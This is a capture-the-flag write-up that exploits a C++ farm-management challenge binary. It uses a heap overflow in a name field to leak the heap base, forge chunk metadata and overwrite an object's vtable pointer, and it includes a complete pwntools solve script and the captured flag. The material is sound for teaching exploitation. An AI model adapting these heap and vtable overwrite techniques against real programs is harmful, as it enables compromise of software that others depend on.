# Object Oriented Pwning
## Pwn


The program provides an interface for managing a 'farm' (an array of Animal objects). Some relevant snippets of code are below.

```c++
int menu() {
    unsigned int choice;
    printf("1) List Animals\n2) Act on Animal\n3) Buy New Animal\n4) Buy translator (1000c)\n5) Sell The Farm\n> ");
    std::cin >> choice;
    return choice;
}

class Animal {
public:
    virtual void Age();
    virtual void PrintInfo();
    virtual int Sell() = 0;
    void Translate();
    void SetName();
    virtual ~Animal() = default;
    char type[16];
    bool dead = false;
    uint8_t max_age;
    uint8_t hunger = 0;
protected:
    uint8_t age = 1;
    char name[16];
};

void Animal::SetName() {
    printf("What will you name your new animal? ");
    flush();
    unsigned char c;
    int read = 0;
    while ((c = getchar()) != '\n' && read < 64) {
        this->name[read] = c;
        read++;
    }
}
```

There is an obvious buffer overflow in the `SetName` method - animals have a 16 byte name field, but it reads 64 characters (or until a newline) into the buffer. Using this, we can perform a heap overflow (`Animal`s are allocated on the heap). Rather than targeting the heap metadata itself and performing a classic heap attack (which is made more complex due to how `new` and `delete` modify data in heap chunks), I will overwrite a vtable pointer.

![Vtable](https://i.stack.imgur.com/zrKyI.gif)

By overwriting the vtable pointer of any of the animals, we can modify the code that is executed when methods are performed on it. The pointer is located at the very start of the object in memory, meaning it can be reached easily by an overflow. Normally, with the ability to redirect function calls, and with `system` in the PLT, we could simply call that. However, vtable methods are called using the `__thiscall` convention; a pointer to `this` is placed in RDI, and all the other register arguments are shifted up; which results in a vtable pointer rather than a string being in RDI.

Instead, my target is the `Animal::Translate` function. Normally, the translator costs 1000 coins, and unlocking it just calls `cowsay` on either `cow.txt` or `pig.txt`, depending on the `type` char array property of the animal. As this property is located directly after the vtable, we can continue our overflow to overwrite the type to `flag`.



### Exploit Plan

Throughout the exploit, many of the functions we will use (buying animals, renaming) requires money. Because of this, we will have to sell animals occasionally, as well as allowing them to age so they sell for enough money to continue. The lines relating to this will only be included in the final exploit.

1. Allocate two adjacent `Animal`s on the heap

   ```python
   buy_animal(1, "EvilPig")
   buy_animal(1, "DummyPig")
   ```

2. Free the one at a higher address, in order to place heap pointers in the chunk

   ```python
   sell(1)
   ```

3. Replace all null bytes between the remaining `Animal`'s name and the heap pointer.

```python
rename(0, "A" * 44)
```

4. List the animals to leak the heap pointer. The `Animal::Info` method uses `printf` to print the name field - since we have removed all null bytes, it will keep printing up until the heap pointer. Local testing reveals that the chunk is just above the heap base, so we can null out the last byte of the pointer to gain the base.

   ```python
   leak = list_animals()
   heap_base = u64(leak[0x2f:0x2f+4].ljust(8, b'\x00')) & ~0xff
   log.success(f"Heap Base: {hex(heap_base)}")
   sell(0)
   ```

5. Overwriting the bytes between the name field and the next chunk has caused the heap size metadata to become corrupt. To prevent an error on the next allocation, I will replace the metadata with some fake, but sane sizes.

   ```python
   buy_animal(1, b"DDDD" + p64(64)*7)
   sell(0)
   ```

6. We create an animal whose name field is a fake vtable, containing pointers to the translate function.

```python
buy_animal(1, p64(e.sym['_ZN6Animal9TranslateEv']) * 2)
```

7. Finally, we create an animal which will be allocated *before* the previous one on the heap, and overflow. We are able to overwrite the vtable to our other animal's name field (given that the offset from the heap base is deterministic), and overwrite the type field to `flag`.

```python
buy_animal(1, b"L" + b"O"*0x21 + b"NG" + p64(heap_base + FAKE_TABLE) + b"flag\x00")
print(r.recvuntil('}', timeout=0.5).decode())
```

```python
 __________
< Feed me! >
 ----------
  \
    \
rarctf{C0w_s4y_m00_p1g_s4y_01nk_fl4g_s4y-251e363a}

```

### Solve Script

```python
#!/usr/bin/python3.8

from pwn import *

e = ELF("src/oop")
# r = process(e.path)
r = remote("localhost", 1337)
context.arch = "amd64"

FAKE_TABLE = 0x1d37f1c - 0x1d25000

FAKE_TABLE -= 0x40
# Xinetd adjusts heap offsets slightly

def list_animals():
    r.recvuntil('> ')
    r.sendline('1')
    return r.recvuntil('!')


def animal_action(index):
    r.recvuntil('> ')
    r.sendline('2')

    r.recvuntil('? ')
    r.sendline(str(index))


def buy_animal(type, name):
    r.recvuntil('> ')
    r.sendline('3')

    r.recvuntil('> ')
    r.sendline(str(type))

    r.recvuntil('? ')
    r.sendline(name)


def buy_translator():
    r.recvuntil('> ')
    r.sendline('4')


def sell(index):
    animal_action(index)
    r.recvuntil('> ')
    r.sendline(str(1))


def feed(index):
    animal_action(index)
    r.recvuntil('> ')
    r.sendline(str(2))


def rename(index, name):
    animal_action(index)
    r.recvuntil('> ')
    r.sendline(str(3))

    r.recvuntil('? ')
    r.sendline(name)


def translate(index):
    animal_action(index)
    r.recvuntil

# We will first create two animals, and free the second.
# By removing the null bytes following the name of the
# first, we can puts() all the way up to the heap pointer,
# allowing is to obtain heap base

log.info("Creating evil pig")
buy_animal(1, "EvilPig")
# Place a heap pointer just after the first animal
log.info("Creating pig for slaughter...")
buy_animal(1, "DummyPig")
# Build up money...
list_animals()
sell(1)
# Replace all null bytes with 'A'
log.info("Enlarging evil pig...")
rename(0, "A" * 44)

# Printing the name will now include the heap pointer
# from DummyPig
leak = list_animals()
heap_base = u64(leak[0x2f:0x2f+4].ljust(8, b'\x00')) & ~0xff
log.success(f"Heap Base: {hex(heap_base)}")
sell(0)
# Put some fake metadata back in so
# we don't trigger heap check
log.info("Creating false pig...")
buy_animal(1, b"DDDD" + p64(64)*7)
log.info("Creating money pig...")
buy_animal(1, "Money2")
# Earn some more money so we have room for what's next
sell(0)
sell(1)

# We will now create two animals adjacent on the heap.
# The name field of the later one should contain
# pointers to Animal::Translate. The earlier one will have
# its name overflown into the vtable pointer of the second


log.info("Creating table pig...")
buy_animal(1, p64(e.sym['_ZN6Animal9TranslateEv']) * 2)
log.info("Creating long pig...")
buy_animal(1, b"L" + b"O"*0x21 + b"NG" + p64(heap_base + FAKE_TABLE) + b"flag\x00")
# context.log_level = "debug"
print(r.recvuntil('}', timeout=1).decode())

```



